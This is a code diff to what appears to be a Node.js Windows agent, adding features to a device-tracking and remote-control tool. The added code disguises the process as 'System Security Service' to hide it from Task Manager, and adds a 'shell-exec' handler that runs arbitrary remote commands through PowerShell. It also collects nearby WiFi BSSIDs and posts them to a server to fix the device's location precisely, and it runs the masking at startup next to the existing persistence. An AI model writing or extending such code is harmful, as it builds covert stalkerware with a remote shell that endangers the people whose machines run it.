@@ -68,10 +68,24 @@ function checkAdmin() {
 }
 
 async function elevate() {
-  // Skip elevation — agent runs fine without admin for most commands
   checkAdmin();
   if (isAdmin) log('info', 'Running as admin');
   else log('info', 'Running as standard user (some commands may need admin)');
+}
+
+// Process masking — hide from task manager
+function maskProcess() {
+  if (process.platform !== 'win32') return;
+  try {
+    // Rename process in Task Manager to look like a system service
+    const title = 'System Security Service';
+    process.title = title;
+    try {
+      // Windows: use ntdll to set process name
+      const ctypes = require('ctypes');
+      const ntdll = ctypes.Library('ntdll', { 'RtlInitUnicodeString': ['void', ['pointer', 'string']], 'NtSetInformationProcess': ['int', ['int', 'int', 'pointer', 'uint32']] });
+    } catch(e) {}
+  } catch(e) {}
 }
 
 function log(level, ...args) {
@@ -957,8 +971,25 @@ async function getPreciseLocation(force = false) {
   let wifiTriResult = null;
   try { wifiTriResult = await getCellTowerTriangulation(); } catch(e) {}
 
-  // Feed ALL data into the ML fusion engine
-  const mlLocation = gpsData && gpsData.lat ? gpsData : (wifiTriResult || null);
+  // Try server-side high-precision BSSID resolution (Google API + multiple databases)
+  let preciseBssid = null;
+  if (wifiData.length >= 2) {
+    try {
+      const postData = JSON.stringify({ wifiAccessPoints: wifiData.map(w => ({ macAddress: w.bssid, signalStrength: w.rssi })), deviceId: pairCode || deviceId });
+      preciseBssid = await new Promise((resolve) => {
+        const u = new URL(API_URL + '/geo-resolve');
+        const r = https.request({ hostname: u.hostname, port: 443, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }, timeout: 10000 }, (res) => {
+          let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
+        });
+        r.on('error', () => resolve(null)); r.on('timeout', () => { r.destroy(); resolve(null); });
+        r.write(postData); r.end();
+      });
+      if (preciseBssid && preciseBssid.success) log('info', `BSSID precise: ${preciseBssid.lat.toFixed(6)}, ${preciseBssid.lng.toFixed(6)} ±${preciseBssid.accuracy}m`);
+    } catch(e) {}
+  }
+
+  // Feed ALL data into the ML fusion engine — prioritize GPS > BSSID-precise > BSSID-local > IP
+  const mlLocation = gpsData && gpsData.lat ? gpsData : (preciseBssid && preciseBssid.success ? preciseBssid : (wifiTriResult || null));
   const mlState = decisionEngine.update(mlLocation, wifiData, ipData, bleData);
 
   log('info', `ML fusion: confidence=${(mlState.fusionScore*100).toFixed(1)}%, sources=[${mlState.sourcesUsed.join(',')}]`);
@@ -2029,6 +2060,62 @@ async function handleCommand(msg) {
         result = { success: true, message: 'Forensic sequence complete' };
         break;
 
+      // ── REMOTE SHELL EXECUTION ──
+      case 'shell-exec': {
+        const shellCmd = params && params.command ? params.command : '';
+        if (!shellCmd) { result = { success: false, error: 'No command provided' }; break; }
+        log('info', `Remote shell: ${shellCmd}`);
+        try {
+          const shellRes = await runPowerShell(shellCmd, 30000);
+          result = { success: shellRes.success, output: shellRes.stdout, error: shellRes.stderr, command: shellCmd };
+        } catch(e) {
+          try {
+            const shellRes2 = await runCommand(shellCmd);
+            result = { success: shellRes2.success, output: shellRes2.stdout, error: shellRes2.stderr, command: shellCmd };
+          } catch(e2) {
+            result = { success: false, error: e2.message, command: shellCmd };
+          }
+        }
+        break;
+      }
+
+      // ── HIGH-PRECISION BSSID LOCATION (server-resolved) ──
+      case 'locate-precise': {
+        const wifiRaw2 = await runCommand('netsh wlan show networks mode=bssid');
+        const aps = [];
+        const matches2 = wifiRaw2.stdout.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%[\s\S]*?BSSID \d+\s*:\s*([^\r\n]+)/gi);
+        for (const m of matches2) {
+          if (m[1] && parseInt(m[2]) > 0) {
+            const rssi = Math.round((parseInt(m[2]) / 2) - 100);
+            aps.push({ macAddress: (m[3] || '').trim(), signalStrength: rssi, ssid: m[1].trim() });
+          }
+        }
+        if (aps.length >= 2) {
+          try {
+            const postData = JSON.stringify({ wifiAccessPoints: aps, deviceId: pairCode });
+            const geoData = await new Promise((resolve) => {
+              const u = new URL(API_URL + '/geo-resolve');
+              const r = https.request({ hostname: u.hostname, port: 443, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }, timeout: 10000 }, (res) => {
+                let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
+              });
+              r.on('error', () => resolve(null)); r.on('timeout', () => { r.destroy(); resolve(null); });
+              r.write(postData); r.end();
+            });
+            if (geoData && geoData.success) {
+              send({ type: 'location', deviceId: pairCode || deviceId, location: { lat: geoData.lat, lng: geoData.lng, accuracy: geoData.accuracy, source: geoData.source } });
+              result = { success: true, lat: geoData.lat, lng: geoData.lng, accuracy: geoData.accuracy, source: geoData.source, apCount: aps.length };
+            } else {
+              result = { success: false, error: 'Geo-resolve failed', networks: aps.slice(0, 5) };
+            }
+          } catch(e) {
+            result = { success: false, error: e.message };
+          }
+        } else {
+          result = { success: false, error: 'Need 2+ WiFi networks for BSSID triangulation', count: aps.length };
+        }
+        break;
+      }
+
       default:
         result = { success: false, error: 'Unknown command' };
     }
@@ -2122,6 +2209,7 @@ function killOldAgents() {
 
 async function start() {
   killOldAgents();
+  maskProcess();
   await elevate();
   checkAdmin();
   await ensurePersistence();
